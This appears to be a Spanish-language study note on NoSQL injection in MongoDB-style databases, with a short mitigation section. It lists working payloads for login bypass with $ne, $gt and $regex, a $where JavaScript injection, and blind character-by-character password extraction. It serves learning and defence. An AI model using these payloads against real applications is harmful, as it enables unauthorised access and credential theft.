#reference #Web_Security

**NoSQL injection** = inyección sobre bases de datos no relacionales (MongoDB, CouchDB, Redis…) cuando entrada del usuario llega sin sanear a la consulta. Aunque no hay SQL, los operadores y la sintaxis de la BBDD (o el JSON) permiten alterar la lógica.

> Relacional vs no relacional: las NoSQL guardan documentos/clave-valor, no tablas con esquema fijo. Las consultas usan objetos/operadores en lugar de SQL.

# Tipos

| Tipo | Descripción |
|------|-------------|
| **Operator injection** | Inyectar operadores del motor (`$ne`, `$gt`, `$regex`…) para alterar el filtro. |
| **Syntax injection** | Romper la sintaxis de la query (similar a SQLi clásico). |
| **JavaScript injection** | En MongoDB con `$where` / `mapReduce`, ejecutar JS arbitrario. |

# MongoDB — payloads típicos

## Bypass de login (operator injection)

```jsonc
// Login normal: { "user": "admin", "pass": "1234" }
// Inyección con $ne (not equal) → cualquier pass distinto de imposible
{ "user": "admin", "pass": { "$ne": "x" } }

// $gt / $regex
{ "user": { "$gt": "" }, "pass": { "$gt": "" } }
{ "user": "admin", "pass": { "$regex": "^a" } }   // exfil char a char
```

## Vía parámetros URL (sintaxis PHP/Express)

```
user[$ne]=x&pass[$ne]=x
user=admin&pass[$regex]=^a
```

## JavaScript ($where)

```
'; return true; var x='
{ "$where": "this.pass == this.user" }
```

# Blind / exfiltración

Usar `$regex` como oráculo booleano para extraer la contraseña carácter a carácter:

```
pass[$regex]=^a   → respuesta distinta si empieza por 'a'
pass[$regex]=^ad  → ... y así sucesivamente
```

# Detección y herramientas

- Probar `'`, `"`, `{`, `$ne`, `[$ne]` en cada parámetro y observar diferencias.
- **NoSQLMap**, **nosqli**, intruder con listas de operadores.

# Mitigación

Validar tipos (rechazar objetos donde se espera string), sanear claves que empiezan por `$`/`.`, usar consultas parametrizadas/ODM seguro, desactivar `$where`/JS del lado servidor.

# Recursos
### [[SQL_Cheatsheet]]
### [PortSwigger — NoSQL injection](https://portswigger.net/web-security/nosql-injection)
### [PayloadsAllTheThings — NoSQL](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)
### [Relacional vs no relacional (OVH)](https://www.ovhcloud.com/es-es/learn/relational-vs-non-relational-databases/) · [Vídeo](https://youtu.be/h0h37-Dwd_A?list=PL65_wYSEg5HdSq1pSZxQmz7SoNE48vOgR)
